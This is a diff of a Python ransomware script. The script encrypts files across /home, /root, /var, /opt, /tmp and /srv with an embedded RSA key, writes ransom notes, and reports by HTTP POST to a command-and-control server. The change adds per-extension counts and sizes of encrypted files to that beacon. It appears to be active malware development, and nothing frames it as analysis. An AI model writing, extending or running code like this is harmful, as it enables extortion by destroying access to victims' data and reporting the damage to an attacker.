@@ -136,6 +136,7 @@ def beacon(sid,stats=None):
             d['encrypted_count']=str(stats['count'])
             d['encrypted_size']=str(stats['size'])
             d['encrypted_types']=','.join(sorted(stats['types']))
+            d['encrypted_detail']=json.dumps(stats.get('detail',{}))
         req=urllib.request.Request(C2,data=urllib.parse.urlencode(d).encode(),method='POST')
         urllib.request.urlopen(req,timeout=10)
     except:pass
@@ -148,7 +149,7 @@ def main():
         td=_tf.mkdtemp();pub_pem_path=os.path.join(td,'pub.pem')
         open(pub_pem_path,'wb').write(RSA_PUB)
     sid=get_sid()
-    stats={'count':0,'size':0,'types':set()}
+    stats={'count':0,'size':0,'types':set(),'detail':{}}
     roots=['/home','/root','/var','/opt','/tmp','/srv']
     for r in roots:
         if not os.path.isdir(r):continue
@@ -160,7 +161,10 @@ def main():
                 if encrypt(fp,pub_obj,pub_pem_path):
                     stats['count']+=1;stats['size']+=sz
                     _,e=os.path.splitext(f)
-                    if e:stats['types'].add(e.lower())
+                    if e:
+                        e=e.lower();stats['types'].add(e)
+                        if e not in stats['detail']:stats['detail'][e]={'count':0,'size':0}
+                        stats['detail'][e]['count']+=1;stats['detail'][e]['size']+=sz
     note_dirs=roots+[os.path.expanduser('~')]
     try:
         for u in os.listdir('/home'):
